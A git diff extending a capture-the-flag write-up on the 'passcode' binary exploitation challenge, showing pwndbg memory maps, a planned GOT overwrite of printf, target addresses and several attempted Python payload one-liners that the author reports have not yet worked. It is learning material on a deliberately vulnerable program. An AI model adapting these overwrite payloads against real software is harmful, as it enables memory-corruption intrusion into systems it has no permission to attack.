@@ -124,4 +124,65 @@ To validate this I ran the program again in GDB and searched for the address of 
 
 Now I was really stuck and had to figure out another way to know what to put in `passcode1`.
 Since I was stuck I started building a mind map to work with a more organized chart of ideas.
-You can view the map using [xmind](https://xmind.com) and view the map of this CTF -> [passcode](./Mind%20Maps/passcode.xmind)
+You can view the map using [xmind](https://xmind.com) and view the map of this CTF -> [passcode](./Mind%20Maps/passcode.xmind). 
+*I recommend viewing this map only if you are interested in the different ideas I had at this point.*
+
+One of the ideas was to inject lines of code. To know if there was a way to do this I opened up pwngdb again and searched for the permissions of the code segment.
+```bash
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+     Start        End Perm     Size Offset File (set vmmap_prefer_relpaths on)
+ 0x8048000  0x8049000 r--p     1000      0 passcode
+ 0x8049000  0x804a000 r-xp     1000   1000 passcode
+ 0x804a000  0x804b000 r--p     1000   2000 passcode
+ 0x804b000  0x804c000 r--p     1000   2000 passcode
+ 0x804c000  0x804d000 rw-p     1000   3000 passcode
+```
+The last memory place is editable. I only had to see what this place points at.
+but then I could see that it's not the code segment but it is actually the data segment so I went to see what global variables I had that might be saved in the data segment.
+
+In the data segment there is something called the GOT (Global Offset Table). This contains the reference to the location of functions like `scanf`, `printf` and `fflush`. My idea was to change the reference table to point at the inner block of the if statement.
+
+So first I will give `name` 96 chars of random placeholders and then `4 bytes` of the printf GOT reference addr. Then I can put a reference to the inner block of the if statement in the scanf of `passcode1`.
+```bash
+pwndbg> search "setregid"
+Searching for byte: b'setregid'
+passcode        0x8048364 'setregid'
+libc.so.6       0xf7d2f7d6 'setregid'
+```
+
+| name                     | address   |
+| ------------------------ | --------- |
+| GOT printf reference     | 0x804c010 |
+| Inner If statement block | 0x8048364 |
+**Now all that was left to do was to build the payload and run!**
+
+Getting decimal view of the addresses
+```python
+In [1]: int(0x804c010)
+Out[1]: 134529040
+
+In [2]: int(0x8048364)
+Out[2]: 134513508
+```
+
+I had a problem with the payload that I was messing with for a few hours in total and I could not figure out why it wasn't getting the input to passcode1. passcode1 did have the correct address in it and it did point to the correct place but for some reason it was not accepting the input for the `printf` reference...
+
+The payloads I have tried:
+```bash
+r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08' + b'\n' + b'\x64\x83\x04\x08')")
+
+r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08\n\x64\x83\x04\x08\n')")
+
+r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08\x64\x83\x04\x08')")
+
+r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 96 + b'\x10\xc0\x04\x08\x64\x83\x04\x08\n')")
+```
+
+results for all of the payloads above
+```bash
+pwndbg> x/x $ebp - 0x10
+0xffefdd48:     0x0804c010
+pwndbg> x/x 0x0804c010
+0x804c010 <printf@got.plt>:     0xf7d91a90
+```
